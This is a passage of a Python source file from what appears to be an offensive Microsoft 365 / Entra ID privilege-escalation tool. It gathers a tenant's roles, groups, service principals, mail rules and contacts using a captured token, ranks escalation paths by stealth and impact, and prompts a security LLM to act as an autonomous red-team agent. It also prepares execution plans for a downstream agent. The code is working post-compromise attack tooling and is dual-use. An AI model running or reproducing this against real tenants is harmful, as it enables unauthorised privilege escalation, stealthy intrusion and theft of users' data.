                match = next(
                    (e for e in edges if e.path_id == base or e.path_id.startswith(base + "::")),
                    None,
                )
                if match:
                    p.path_id = match.path_id
                else:
                    continue
            if p.path_id in deterministic_map:
                p.source = "sec-analyst"
                grounded.append(p)

        if not grounded:
            return deterministic

        # Top up to 3 using deterministic order if AI returned fewer
        for p in deterministic:
            if len(grounded) >= 3:
                break
            if p.path_id not in {g.path_id for g in grounded}:
                grounded.append(p)

        grounded.sort(key=lambda p: p.probability, reverse=True)
        return grounded[:3]

    # ----------------------------------------------------------
    # Map: gain keywords -> scopes/capabilities the gain unlocks once the
    # path succeeds. Used to surface "enables" hints for multi-hop chaining.
    _ENABLES_MAP: List[tuple] = [
        (("directory.readwrite",), ["Directory.ReadWrite.All", "role self-assignment", "group write access"]),
        (("application.readwrite",), ["Application.ReadWrite.All", "app role grants on owned SPs"]),
        (("app role",), ["app-role assignment to any principal"]),
        (("domain admin",), ["Full directory control", "Privileged Role Admin", "Global Admin delegation"]),
        (("app admin",), ["Enterprise application management", "client secret rotation"]),
        (("guest",), ["New attacker-controllable principal in the tenant"]),
        (("persistence",), ["Survives token expiry / re-auth"]),
    ]

    def _enables_for(self, gain: str) -> List[str]:
        lowered = (gain or "").lower()
        out: List[str] = []
        for keywords, unlocks in self._ENABLES_MAP:
            if all(k in lowered for k in keywords):
                for u in unlocks:
                    if u not in out:
                        out.append(u)
        return out

    @staticmethod
    def _scopes_met(required: List[str], granted: List[str]) -> bool:
        """Same semantics as EdgeExpander._scopes_satisfied (standalone copy
        so the analyst does not need an expander instance)."""
        granted = [s for s in (granted or []) if s]
        def has(scope: str) -> bool:
            if scope in granted:
                return True
            base, _, variant = scope.rpartition(".")
            if variant == "ReadWrite" and base:
                if f"{base}.ReadWrite.All" in granted:
                    return True
            if variant in ("Read", "ReadWrite") and base:
                if f"{base}.{variant}.All" in granted:
                    return True
                if f"{base}.ReadWrite.All" in granted:
                    return True
            return False
        return all(has(sc) for sc in (required or []))

    def _build_candidates(self, edges: List[EscalationEdge], recon_data: ReconData) -> str:
        compact = []
        for e in edges:
            compact.append({
                "path_id": e.path_id,
                "name": e.name,
                "description": e.description,
                "required_scopes": e.required_scopes,
                "required_scopes_satisfied": self._scopes_met(e.required_scopes, recon_data.granted_scopes),
                "gain": e.gain,
                "enables": self._enables_for(e.gain),
                "dependencies": e.prereq_objects,
                "evidence": e.evidence or {"note": "generic path, no specific object observed"},
                "confidence": round(e.confidence, 3),
                "stealth_score": round(e.stealth_score, 3),
                "steps": e.resolved_steps(),
                "graph_call": e.graph_call,
            })
        return json.dumps(compact, indent=2)

    def _build_prompt(self, candidates_json: str, recon_data: ReconData,
                      edges: Optional[List[EscalationEdge]] = None) -> str:
        user_upn = (recon_data.user or {}).get("userPrincipalName", "unknown")
        # OBJECTS OBSERVED IN RECON: the ONLY objects the analyst may reference.
        observed = {
            "groups": [
                {"id": g.get("id"), "name": g.get("displayName"), "user_is_owner": bool(g.get("is_owner"))}
                for g in (recon_data.groups or [])[:15]
            ],
            "applications_service_principals": [
                {"id": a.get("id"), "name": a.get("displayName"), "user_owns": bool(a.get("user_owns")),
                 "high_priv_app_roles": [r.get("value") for r in (a.get("app_roles") or [])][:4]}
                for a in (recon_data.applications or [])[:15]
            ],
            "privileged_roles_held": [
                r.get("displayName") for r in (recon_data.privileged_roles or []) if isinstance(r, dict)
            ],
            "mail_rules_count": len(recon_data.mail_rules or []),
            "contacts_count": len(recon_data.contacts or []),
        }
        misconfigs = []
        for m in (recon_data.misconfigs or [])[:12]:
            item: Dict[str, Any] = {"type": m.get("type"), "severity": m.get("severity"),
                                    "description": m.get("description")}
            if m.get("app_id"):
                item["app_id"] = m["app_id"]
            misconfigs.append(item)
        recon_summary = {
            "user": user_upn,
            "granted_scopes": recon_data.granted_scopes,
            "objects_observed": observed,
            "misconfigs": misconfigs,
        }
        # Deterministic multi-hop chains (2-3 edge composites).
        chains: List[Dict[str, Any]] = []
        if edges is not None:
            try:
                exp = EdgeExpander.__new__(EdgeExpander)
                exp.edges = list(edges)
                exp.recon = recon_data
                for c in exp.build_chains():
                    c = dict(c)
                    c["steps"] = c.get("steps", [])[:8]
                    chains.append(c)
            except Exception as e:
                logger.debug("[SecAnalyst] chain build failed: %s", e)
        return (
            "RECON CONTEXT (JSON) - the ONLY facts you may use:\n"
            + json.dumps(recon_summary, indent=2)
            + "\n\nGRANTED SCOPES (live, decoded from the current token JWT):\n"
            + json.dumps(recon_data.granted_scopes, indent=2)
            + "\nA candidate path is only viable if its required_scopes are satisfied by the granted scopes.\n\n"
            + "CANDIDATE ESCALATION PATHS (JSON):\n"
            + candidates_json
            + ("\n\nCANDIDATE CHAINS (deterministic multi-hop composites, JSON):\n"
               + json.dumps(chains, indent=2)
               if chains else "")
            + "\n\nSELECTION CRITERIA (in priority order):\n"
            "1. Likelihood the path succeeds given GRANTED SCOPES and objects observed (confidence)\n"
            "2. Impact of the privilege gained (Domain Admin > App Admin > persistence/evasion)\n"
            "3. Stealth / detectability\n\n"
            "STRICT RULES:\n"
            "- path_id MUST be copied EXACTLY from the candidate list (including any '::' object id). Never invent a path_id.\n"
            "- Only reference object IDs/names present in objects_observed or the candidate's evidence.\n"
            "- Prefer multi-hop chains over single steps when the chain's final gain is higher.\n"
            "\nReturn ONLY valid JSON, no markdown, in exactly this shape:\n"
            '{"top_paths": [{"path_id": "<exact path_id from candidates>", '
            '"steps": ["step 1", "step 2", "step 3"], '
            '"probability": 0.87, '
            '"narrative": "1-2 sentence human readable description of the route", '
            '"reasoning": "2-3 sentences on why this route is probable in THIS environment, citing observed objects"}]}\n'
            "probability must be a float between 0.0 and 1.0."
        )

    # ----------------------------------------------------------
    def _call_foundationsec(self, prompt: str) -> Optional[str]:
        """Call Foundation-Sec-8B (always the primary model) with retries.

        Serialized through llm_call() so it never runs concurrently with the
        replanner/explorer (both share the same Ollama endpoint).
        """
        if not (SEC_API_KEY or SEC_BASE_URL):
            logger.warning("[FoundationSec] SEC_BASE_URL/SEC_API_KEY not configured")
            return None
        headers = {"Content-Type": "application/json"}
        if SEC_API_KEY:
            headers["Authorization"] = f"Bearer {SEC_API_KEY}"
        payload = {
            "model": SEC_MODEL,
            "messages": [
                {"role": "system", "content": self.SYSTEM_PROMPT},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.2,
            "max_tokens": 2200,
            # Disable the hybrid "thinking" mode: by default the model spends
            # its tokens on an internal reasoning field and returns empty
            # `content`. Ignored by non-Ollama OpenAI-compatible servers.
            "think": False,
            # llama.cpp sampling extras (ignored by OpenAI-compatible servers)
            "repetition_penalty": 1.2,
            "min_p": 0.05,
        }
        messages = payload["messages"]
        last_err = None
        with llm_call():
            for attempt in range(1, self.MAX_RETRIES + 1):
                try:
                    resp = requests.post(self.model_url, json=payload, headers=headers, timeout=300)
                    if resp.status_code != 200:
                        last_err = f"HTTP {resp.status_code}: {resp.text[:200]}"
                        logger.info("[FoundationSec] attempt %d/%d %s", attempt, self.MAX_RETRIES, last_err)
                        continue
                    content = resp.json()["choices"][0]["message"]["content"]
                    # Corrective retry: if the model chatted instead of returning
                    # JSON, feed it back and demand a strict JSON object.
                    if attempt < self.MAX_RETRIES and not _extract_json(content):
                        logger.info("[FoundationSec] attempt %d/%d returned non-JSON; nudging: %r",
                                    attempt, self.MAX_RETRIES, content[:120])
                        messages.append({"role": "assistant", "content": content})
                        messages.append({"role": "user", "content":
                            'Your previous response was not a JSON object. '
                            'Respond with ONLY the JSON object requested - no prose, no markdown. '
                            'First character must be { and last must be }.'})
                        continue
                    return content
                except Exception as e:
                    last_err = str(e)
                    logger.info("[FoundationSec] attempt %d/%d failed: %s", attempt, self.MAX_RETRIES, e)
        logger.warning("[FoundationSec] unavailable after %d attempts (%s)", self.MAX_RETRIES, last_err)
        return None

    def _call_groq(self, prompt: str) -> Optional[str]:
        if not GROQ_API_KEY:
            return None
        headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
        payload = {
            "model": SCOUT_MODEL,
            "messages": [
                {"role": "system", "content": self.SYSTEM_PROMPT},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.2,
            "max_tokens": 1200,
            "response_format": {"type": "json_object"},
        }
        try:
            with llm_call():
                resp = requests.post(GROQ_ENDPOINT, json=payload, headers=headers, timeout=60)
            if resp.status_code != 200:
                logger.info("[Groq] HTTP %s: %s", resp.status_code, resp.text[:200])
                return None
            return resp.json()["choices"][0]["message"]["content"]
        except Exception as e:
            logger.info("[Groq] unavailable (%s) - using deterministic selection", e)
            return None

    # ----------------------------------------------------------
    def _parse_response(self, response: str, edges: List[EscalationEdge],
                        recon_data: Optional[ReconData] = None) -> List[RankedPath]:
        """Robustly parse model JSON into RankedPath objects (may be partial).

        Scope gating: when recon_data is provided, a candidate whose required
        scopes are not satisfied by the LIVE granted scopes is dropped - this
        stops the analyst from recommending paths the current token cannot run.
        """
        logger.debug("[FoundationSec] raw response (first 500 chars): %r", (response or "")[:500])
        data = _extract_json(response)
        if not data:
            logger.warning("[FoundationSec] could not extract JSON from model output")
            return []

        edge_map = {e.path_id: e for e in edges}
        out: List[RankedPath] = []
        for item in data.get("top_paths", [])[:3]:
            if not isinstance(item, dict):
                continue
            pid = item.get("path_id")
            edge = edge_map.get(pid)
            if not edge:
                continue
            # Anti-hallucination gate: skip paths the live token cannot execute.
            if recon_data is not None and not self._scopes_met(
                edge.required_scopes, recon_data.granted_scopes
            ):
                logger.info(
                    "[FoundationSec] dropping %s - required scopes %s not satisfied by live scopes",
                    pid, edge.required_scopes,
                )
                continue
            try:
                prob = min(1.0, max(0.0, float(item.get("probability", edge.confidence))))
            except (TypeError, ValueError):
                prob = edge.confidence
            steps = item.get("steps") or edge.resolved_steps()
            if not isinstance(steps, list):
                steps = [str(steps)]
            out.append(RankedPath(
                path_id=edge.path_id,
                name=edge.name,
                description=item.get("description") or edge.description,
                steps=[str(s) for s in steps],
                probability=prob,
                impact=edge.gain,
                stealth_score=edge.stealth_score,
                time_estimate=item.get("time_estimate", "2-5 minutes"),
                narrative=item.get("narrative") or edge.description,
                reasoning=item.get("reasoning") or "Selected by AI reasoning layer.",
                source="sec-analyst",
            ))
        return out

    # ----------------------------------------------------------
    def _fallback_selection(self, edges: List[EscalationEdge]) -> List[RankedPath]:
        """Deterministic fallback: score = w_conf*confidence + w_impact*impact + w_stealth*stealth."""
        scored = []
        for e in edges:
            impact = self._edge_def(e).get("impact", 0.5)
            score = 0.5 * e.confidence + 0.3 * impact + 0.2 * e.stealth_score
            scored.append((score, e))
        scored.sort(key=lambda x: x[0], reverse=True)

        out = []
        for score, e in scored[:3]:
            prob = min(0.95, max(0.35, score))  # clamp to a sane probability band
            out.append(RankedPath(
                path_id=e.path_id,
                name=e.name,
                description=e.description,
                steps=self._default_steps(e),
                probability=prob,
                impact=e.gain,
                stealth_score=e.stealth_score,
                time_estimate=self._edge_def(e).get("time", "2-5 minutes"),
                narrative=f"{e.name}: {e.description}",
                reasoning=(
                    f"Deterministic score 0.{int(score*100):02d} = 0.5*confidence"
                    f"({e.confidence:.2f}) + 0.3*impact + 0.2*stealth({e.stealth_score:.2f}). "
                    f"Requires scopes: {', '.join(e.required_scopes)}."
                ),
                source="deterministic",
            ))
        return out

    def _edge_def(self, edge: EscalationEdge) -> Dict[str, Any]:
        base = edge.path_id.split("::")[0]
        return next((d for d in EdgeExpander.EDGE_TABLE if d["id"] == base), {})

    def _default_steps(self, edge: EscalationEdge) -> List[str]:
        scope_step = "Verify granted scope: " + ", ".join(edge.required_scopes)
        return [scope_step, edge.action, edge.graph_call]


# ============================================================
# FREESTYLE FOUNDATION-SEC-8B PRIVESC EXPLORER
# ============================================================

class SecExplorer:
    """Freestyle, non-deterministic privilege-escalation hunter.

    Unlike SecAnalyst (which ranks a fixed deterministic edge table),
    this class gives the model a small Graph query tool and lets it
    FREELY explore the tenant for escalation routes it discovers on its own.
    The model drives up to MAX_TURNS tool calls; each turn it may issue one
    Microsoft Graph GET (whitelisted prefixes, $top capped) and receive the
    JSON response before deciding the next step or finishing.

    Returns a list of free-form paths: name / description / steps /
    probability / evidence. NOT bound to EDGE_TABLE.
    """

    SYSTEM_PROMPT = (
        "You are an autonomous Microsoft 365 / Entra ID red-team agent "
        "performing FREE privilege-escalation reconnaissance. "
        "You are NOT limited to any preset list of attack paths: explore the tenant "
        "freely - privileged roles, group ownership, service principals, enterprise "
        "application app roles, app role assignments, guest users, mail rules, "
        "delegated permissions, verified domains, administrative units - anything "
        "that could lead to higher privilege.\n"
        "Each turn you may do ONE of:\n"
        '1) Query the tenant: respond with {"action": "query", "endpoint": "/...", "why": "..."}\n'
        "2) Finish: respond with "
        '{"action": "finish", "paths": [{"name": "...", "description": "...", '
        '"steps": ["...", "..."], "probability": 0.0-1.0, "evidence": "..."}]}\n'
        "Finish rules — read carefully:\n"
        '   - "name" is a SHORT concrete title (e.g. "SP AppRole PrivEsc via Owned Object") '
        "— REQUIRED, never empty or generic.\n"
        '   - "description" describes what you FOUND in the results, not what to look for next.\n'
        '   - "evidence" MUST quote or reference specific values from RESULT blocks '
        "(object IDs, role names, counts, display names). "
        "Generic statements like 'further analysis required' are not evidence.\n"
        '   - "probability" reflects confidence based ONLY on data already returned. '
        "NEVER return a path with probability 0.0 — omit it entirely instead.\n"
        "   - Do NOT use language like 'check if', 'review', 'could', 'may', 'might' "
        "— describe actual findings, not suggestions for future work.\n"
        "   - An empty paths list is valid and strongly preferred over zero-evidence "
        "or speculative paths.\n"
        "Query rules:\n"
        "- ONLY respond with a single JSON object - no prose, no explanation, no markdown.\n"
        "- The first character of your response must be { and the last must be }.\n"
        "- Only Microsoft Graph v1 GET endpoints (start with /), no spaces in the endpoint.\n"
        "- Keep $top <= 50. Every query must be DIFFERENT from all previous ones.\n"
        "- If a query returns an error, try a different endpoint immediately.\n"
        "- Do NOT repeat the same text. Do NOT narrate. Just JSON.\n"
    )

    MAX_TURNS = 8
    MAX_CONSECUTIVE_REPEATS = 2
    MAX_TOP = 50
    ALLOWED_PREFIXES = (
        "/me", "/users", "/groups", "/servicePrincipals", "/applications",
        "/roleManagement", "/administrativeUnits", "/organization", "/domains",
        "/invitations", "/directoryRoles", "/directoryObjects",
    )

    def __init__(self, token_mgr):
        self.token_mgr = token_mgr
        self.model_url = (SEC_BASE_URL or "").rstrip("/") + "/chat/completions"
        self.queries_made: List[str] = []

    # ----------------------------------------------------------
    def explore(self) -> List[Dict[str, Any]]:
        """Run the conversational exploration loop; return discovered paths."""
        if not (SEC_API_KEY or SEC_BASE_URL):
            logger.warning("[Explorer] SEC_BASE_URL/SEC_API_KEY not configured")
            return []

        seed = (
            "Find privilege escalation routes in this tenant. "
            "Suggested first endpoints: /me, /me/roleAssignments, /me/memberOf, "
            "/servicePrincipals?$top=20. "
            f"You have {self.MAX_TURNS} turns total. "
            "Plan to query for the first 5-6 turns, then synthesise and finish. "
            'Respond NOW with your first JSON object: {"action": "query", "endpoint": "/...", "why": "..."}'
        )
        messages = [
            {"role": "system", "content": self.SYSTEM_PROMPT},
            {"role": "user", "content": seed},
        ]

        consecutive_repeats = 0
        last_endpoint: Optional[str] = None

        for turn in range(1, self.MAX_TURNS + 1):
            turns_remaining = self.MAX_TURNS - turn
            temperature = min(0.3 + 0.2 * consecutive_repeats, 1.0)

            # ── Mandatory finish on last turn ──────────────────────────
            if turns_remaining == 0:
                logger.info("[Explorer] final turn — injecting mandatory finish prompt")
                already = ", ".join(self.queries_made)
                messages.append({"role": "user", "content":
                    "This is your FINAL turn. No more queries are allowed. "
                    f"You queried: [{already}]. "
                    "Look at ALL RESULT blocks above and synthesise every escalation path "
                    "those results directly evidence. Do NOT speculate or suggest further queries. "
                    "Low-probability paths count. An empty paths list is valid if nothing was found. "
                    'You MUST respond with {"action": "finish", "paths": [...]} — '
                    "no queries allowed."})

            try:
                with llm_call():
                    resp = requests.post(self.model_url, json={
                    "model": SEC_MODEL,
                    "messages": messages,
                    "temperature": 0.1 if turns_remaining == 0 else temperature,
                    "max_tokens": 3000 if turns_remaining == 0 else 1500,
                    "think": False,
                    "repetition_penalty": 1.3,
                    "min_p": 0.05,
                }, headers=self._make_headers(), timeout=300)

                if resp.status_code != 200:
                    logger.warning("[Explorer] HTTP %s: %s", resp.status_code, resp.text[:200])
                    break
                content = resp.json()["choices"][0]["message"]["content"]

            except Exception as e:
                logger.warning("[Explorer] model call failed (turn %d): %s", turn, e)
                break

            decision = self._parse_decision(content)

            # ── Unparseable output ─────────────────────────────────────
            if not decision:
                logger.info("[Explorer] unparseable output (turn %d): %s", turn, content[:200])
                messages.append({"role": "assistant", "content": content})
                messages.append({"role": "user", "content":
                    'Invalid JSON. Respond ONLY with one JSON object: '
                    '{"action": "query", "endpoint": "/...", "why": "..."} or '
                    '{"action": "finish", "paths": [...]}. No prose.'})
                consecutive_repeats += 1
                continue

            action = decision.get("action")

            # ── Finish ─────────────────────────────────────────────────
            if action == "finish":
                paths = decision.get("paths") or []
                for p in paths:
                    p["source"] = "sec8b_freestyle"
                    p["queries_explored"] = self.queries_made[:]
                logger.info("[Explorer] finished after %d queries, %d paths found",
                            len(self.queries_made), len(paths))
                return paths

            # ── Query ──────────────────────────────────────────────────
            if action == "query":

                # Model ignored mandatory finish prompt — force synthesis
                if turns_remaining == 0:
                    logger.warning("[Explorer] model queried on final turn — forcing synthesis")
                    return self._force_synthesis(messages)

                endpoint = str(decision.get("endpoint", "")).strip()

                # Parsed-endpoint repeat detection
                if endpoint == last_endpoint:
                    consecutive_repeats += 1
                    logger.warning("[Explorer] repeated endpoint %r (turn %d, repeat #%d)",
                                   endpoint, turn, consecutive_repeats)

                    if consecutive_repeats >= self.MAX_CONSECUTIVE_REPEATS:
                        logger.warning("[Explorer] %d consecutive repeats — forcing synthesis",
                                       consecutive_repeats)
                        return self._force_synthesis(messages)

                    already = ", ".join(self.queries_made)
                    messages.append({"role": "assistant", "content": content})
                    messages.append({"role": "user", "content":
                        f"You already queried {endpoint!r}. "
                        f"Queried so far: [{already}]. "
                        f"Issue a DIFFERENT endpoint or finish. "
                        f"{turns_remaining} turns remaining."})
                    continue

                # Valid new query
                consecutive_repeats = 0
                last_endpoint = endpoint
                result = self._safe_graph_get(endpoint)
                self.queries_made.append(endpoint)
                snippet = json.dumps(result)[:4000]

                if turns_remaining <= 3:
                    budget_msg = (
                        f"{turns_remaining - 1} turns remaining after this — "
                        "start wrapping up and prepare to finish."
                    )
                else:
                    budget_msg = f"{turns_remaining - 1} turns remaining."

                messages.append({"role": "assistant", "content": content})
                messages.append({"role": "user", "content":
                    f"RESULT for {endpoint}: {snippet}\n"
                    f"Queried so far: [{', '.join(self.queries_made)}]. "
                    f"Do NOT re-query any of those. {budget_msg}"})
                continue

            logger.info("[Explorer] unknown action %r — stopping", action)
            break

        logger.info("[Explorer] loop exited without finish — forcing synthesis")
        return self._force_synthesis(messages)

    # ----------------------------------------------------------
    def _force_synthesis(self, messages: List[Dict]) -> List[Dict[str, Any]]:
        """
        Last-resort synthesis call.
        Sends the full conversation back and demands a finish response.
        Called when the model exhausts turns, ignores the final-turn prompt,
        or gets stuck in a repeat loop.
        """
        logger.info("[Explorer] _force_synthesis: issuing mandatory finish call")
        already = ", ".join(self.queries_made)
        synthesis_messages = messages + [{
            "role": "user",
            "content":
                "STOP. You must finish NOW. No more queries allowed. "
                f"You queried: [{already}]. "
                "Review ALL RESULT blocks above and synthesise ONLY escalation paths "
                "directly evidenced by that data — privileged roles, group ownerships, "
                "app role assignments, misconfigured service principals, anything concrete. "
                "Do NOT speculate. Do NOT suggest further queries. "
                "If the results show no escalation surface, return an empty paths list. "
                'Respond ONLY with: {"action": "finish", "paths": [...]}.'
        }]
        try:
            with llm_call():
                resp = requests.post(self.model_url, json={
                    "model": SEC_MODEL,
                    "messages": synthesis_messages,
                    "temperature": 0.1,
                    "max_tokens": 3000,
                    "think": False,
                    "repetition_penalty": 1.0,
                }, headers=self._make_headers(), timeout=300)

            if resp.status_code != 200:
                logger.warning("[Explorer] _force_synthesis HTTP %s", resp.status_code)
                return []

            content = resp.json()["choices"][0]["message"]["content"]
            decision = self._parse_decision(content)

            if decision and decision.get("action") == "finish":
                paths = decision.get("paths") or []
                for p in paths:
                    p["source"] = "sec8b_freestyle_forced"
                    p["queries_explored"] = self.queries_made[:]
                logger.info("[Explorer] _force_synthesis recovered %d paths", len(paths))
                return paths

            logger.warning("[Explorer] _force_synthesis: model still did not finish — giving up")
            return []

        except Exception as e:
            logger.warning("[Explorer] _force_synthesis failed: %s", e)
            return []

    # ----------------------------------------------------------
    def _make_headers(self) -> Dict[str, str]:
        headers = {"Content-Type": "application/json"}
        if SEC_API_KEY:
            headers["Authorization"] = f"Bearer {SEC_API_KEY}"
        return headers

    # ----------------------------------------------------------
    def _safe_graph_get(self, endpoint: str) -> Any:
        """Whitelisted, capped Graph GET executed with the captured token."""
        if not endpoint.startswith("/") or " " in endpoint:
            return {"error": "endpoint must start with / and contain no spaces"}
        if not any(endpoint.startswith(p) for p in self.ALLOWED_PREFIXES):
            return {"error": f"endpoint prefix not allowed: {endpoint.split('?')[0]}"}
        path, _, query = endpoint.partition("?")
        params = []
        if query:
            for kv in query.split("&"):
                k, _, v = kv.partition("=")
                if k == "$top" and v.isdigit() and int(v) > self.MAX_TOP:
                    v = str(self.MAX_TOP)
                params.append(f"{k}={v}")
        ep = path + ("?" + "&".join(params) if params else "")
        try:
            data = _graph_get(self.token_mgr, ep, timeout=30)
            if isinstance(data, dict) and isinstance(data.get("value"), list):
                data = dict(data)
                data["value"] = data["value"][: self.MAX_TOP]
            return data
        except Exception as e:
            return {"error": str(e)}

    # ----------------------------------------------------------
    @staticmethod
    def _parse_decision(content: str) -> Optional[Dict[str, Any]]:
        """Extract a JSON object from model output using the shared robust parser."""
        return _extract_json(content)

# Backwards-compatible class aliases (legacy Qwen* names).
QwenReasoner = SecAnalyst
QwenExplorer = SecExplorer

# ============================================================
# MAIN ORCHESTRATOR
# ============================================================

class PrivilegeEscalationEngine:
    """Orchestrates: recon -> edge expansion -> Foundation-Sec-8B selection -> top 3 JSON."""

    def __init__(self, token_mgr=None):
        self.token_mgr = token_mgr
        self.recon_data: Optional[ReconData] = None
        self.edges: List[EscalationEdge] = []
        self.ranked_paths: List[RankedPath] = []

    # ----------------------------------------------------------
    def build_recon_from_parallel(self, recon_data: Dict[str, Any]) -> ReconData:
        """Build ReconData from a parallel_recon() dict + token JWT scopes.

        recon_data keys (from postexp.parallel_recon):
          inbox_rules, contacts, events, sent_items, mail_folders,
          manager, direct_reports, organization
        Optional extras (passed by caller): granted_scopes, user, groups, applications.
        """
        recon_data = recon_data or {}

        granted_scopes = recon_data.get("granted_scopes") or []
        if not granted_scopes:
            granted_scopes = scopes_from_token(self.token_mgr.access_token if self.token_mgr else None)

        user = recon_data.get("user")
        if not user:
            user = _graph_get(self.token_mgr, "/me") or {}

        groups = recon_data.get("groups")
        if groups is None:
            raw = _graph_get(self.token_mgr, "/me/memberOf")
            groups = [
                {
                    "id": g.get("id"),
                    "displayName": g.get("displayName") or g.get("mailNickname", ""),
                    "is_owner": False,
                }
                for g in _values(raw)
            ]

        applications = recon_data.get("applications")
        if applications is None:
            raw = _graph_get(self.token_mgr, "/servicePrincipals?$top=100&$select=id,displayName,servicePrincipalType")
            applications = [
                {
                    "id": s.get("id"),
                    "displayName": s.get("displayName", ""),
                    "servicePrincipalType": s.get("servicePrincipalType", "Application"),
                    "is_owner": False,
                }
                for s in _values(raw)
            ]

        # --- Deeper application / service-principal inspection ---
        # /servicePrincipals and /me/roleAssignments require directory-level
        # scopes. A pure delegated token (User.Read + mail) gets 403/empty,
        # so if CLIENT_SECRET is configured we also try an app-only
        # (client_credentials) token for these queries.
        app_token = _client_credentials_token()
        if not applications:
            if app_token:
                logger.info("[recon] delegated token returned no service principals; "
                            "retrying with client_credentials token")
                raw = _graph_get_with(app_token, "/servicePrincipals?$top=100&$select=id,displayName,servicePrincipalType")
                applications = [
                    {
                        "id": s.get("id"),
                        "displayName": s.get("displayName", ""),
                        "servicePrincipalType": s.get("servicePrincipalType", "Application"),
                        "is_owner": False,
                    }
                    for s in _values(raw)
                ]
            else:
                logger.warning("[recon] /servicePrincipals empty and no OAUTH_CLIENT_SECRET "
                               "set - cannot fetch an app-only token. "
                               "SP-based escalation paths will not be generated.")

        # --- Mark ownership (works with delegated token: /me/ownedObjects) ---
        if applications and self.token_mgr is not None:
            owned_ids: set = set()
            raw_owned = _graph_get(self.token_mgr, "/me/ownedObjects?$select=id")
            for o in _values(raw_owned):
                if o.get("id"):
                    owned_ids.add(o["id"])
            for app in applications:
                app["user_owns"] = app.get("id") in owned_ids
                app["is_owner"] = app["user_owns"]
                # Fetch app roles exposed by this SP (best-effort, capped)
                app["app_roles"] = _sp_app_roles(self.token_mgr, app.get("id"))

        # --- Direct privileged role assignments (Global Admin, PRA, ...) ---
        privileged_roles: List[Dict[str, Any]] = []

        def _resolve_role_rows(rows):
            for r in rows:
                rid = r.get("roleDefinitionId")
                if not rid or rid in {p["id"] for p in privileged_roles}:
                    continue
                raw_def = _graph_get_with(app_token, f"/roleManagement/directory/roleDefinitions/{rid}") \
                    if app_token else {}
                if not raw_def and self.token_mgr is not None:
                    raw_def = _graph_get(self.token_mgr, f"/roleManagement/directory/roleDefinitions/{rid}")
                name = raw_def.get("displayName") if isinstance(raw_def, dict) else None
                if name:
                    privileged_roles.append({
                        "id": rid,
                        "displayName": name,
                        "scope": r.get("scope", "/"),
                    })

        if self.token_mgr is not None:
            raw_roles = _graph_get(self.token_mgr, "/me/roleAssignments?$select=roleDefinitionId,principalId,scope")
            _resolve_role_rows(_values(raw_roles))
            if not privileged_roles and app_token:
                # app-only token: query the user's role assignments by object id
                uid = (user or {}).get("id")
                if uid:
                    raw_roles = _graph_get_with(app_token, f"/users/{uid}/roleAssignments?$select=roleDefinitionId,principalId,scope")
                    _resolve_role_rows(_values(raw_roles))
        if not privileged_roles and app_token:
            # /me/roleAssignments works directly under an app token too
            _resolve_role_rows(_values(_graph_get_with(app_token, "/me/roleAssignments?$select=roleDefinitionId,principalId,scope")))
        # Last resort: group memberships can carry privileged role group names
        if not privileged_roles:
            _PRIV_NAMES = {
                "Global Administrator", "Privileged Role Administrator",
                "Application Administrator", "Company Administrator",
                "Security Administrator", "Billing Administrator",
                "User Administrator", "Guest Inviter",
            }
            if self.token_mgr is not None:
                raw_members = _graph_get(self.token_mgr, "/me/memberOf?$select=id,displayName,objectType")
                for g in _values(raw_members):
                    if (g.get("displayName") or "") in _PRIV_NAMES or \
                            (g.get("objectType") or "").lower() == "directoryrole":
                        privileged_roles.append({
                            "id": g.get("id"),
                            "displayName": g.get("displayName", ""),
                            "scope": "/",
                        })
        if not privileged_roles:
            logger.info("[recon] no privileged role assignments found for user "
                        "(delegated token lacks Directory.Read.All and no client secret set?)")

        mail_rules = _values(recon_data.get("inbox_rules"))
        contacts = _values(recon_data.get("contacts"))

        recon = ReconData(
            granted_scopes=granted_scopes,
            user=user,
            groups=groups,
            applications=applications,
            mail_rules=mail_rules,
            contacts=contacts,
            misconfigs=[],
            privileged_roles=privileged_roles,
            group_details=self._build_group_details(groups),
        )
        recon.misconfigs = _detect_misconfigs(recon)
        return recon

    # ----------------------------------------------------------
    def _build_group_details(self, groups: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Per-group privilege detail for multi-hop chain hints (capped, best-effort).

        For each group (max 10) fetch owners + group role assignments so the
        analyst can reason about: take over group -> become owner -> grant role.
        """
        if self.token_mgr is None or not groups:
            return []
        details: List[Dict[str, Any]] = []
        _PRIV_NAMES = {
            "Global Administrator", "Privileged Role Administrator",
            "Application Administrator", "Company Administrator",
            "Security Administrator", "Billing Administrator",
            "User Administrator", "Guest Inviter",
        }
        for g in list(groups)[:10]:
            gid = g.get("id")
            if not gid:
                continue
            item: Dict[str, Any] = {
                "id": gid,
                "name": g.get("displayName") or "",
                "user_is_owner": bool(g.get("is_owner")),
                "owners": [],
                "is_privileged": (g.get("displayName") or "") in _PRIV_NAMES,
            }
            try:
                raw = _graph_get(self.token_mgr, f"/groups/{gid}/owners?$select=id,displayName")
                item["owners"] = [
                    {"id": o.get("id"), "name": o.get("displayName", "")}
                    for o in _values(raw)
                ]
                # If the user is an owner of this group, upgrade the flat group record too.
                for o in item["owners"]:
                    if (g.get("userPrincipalName") and o.get("name") == g.get("userPrincipalName")) or \
                            (g.get("is_owner") and o.get("id") == g.get("id")):
                        item["user_is_owner"] = True
                raw_members = _graph_get(self.token_mgr, f"/groups/{gid}/members?$select=id,objectType,displayName")
                for m in _values(raw_members):
                    if (m.get("objectType") or "").lower() == "directoryrole" or \
                            (m.get("displayName") or "") in _PRIV_NAMES:
                        item["is_privileged"] = True
            except Exception as e:
                logger.debug("[recon] group detail fetch failed for %s: %s", gid, e)
            details.append(item)
        return details

    # ----------------------------------------------------------
    def build_attempt_targets(self) -> List[Dict[str, Any]]:
        """Execution-ready targets for a downstream ReAct agent (Task 3).

        One target per ranked path (top 3) or, when no ranked paths exist, per
        candidate edge. Each target carries a per-step execution plan with
        method/endpoint/verify/rollback so the agent can run them one at a
        time (dry-run by default) and re-plan on failure.
        """
        targets: List[Dict[str, Any]] = []
        edge_by_id = {e.path_id: e for e in self.edges}
        sources: List[tuple] = []
        if self.ranked_paths:
            for p in self.ranked_paths[:3]:
                edge = edge_by_id.get(p.path_id)
                steps = p.steps or (edge.resolved_steps() if edge else [])
                graph_call = edge.graph_call if edge else ""
                targets.append(self._make_target(p.path_id, p.name, p.narrative,
                                                steps, graph_call, edge, p.source))
        else:
            for e in self.edges[:5]:
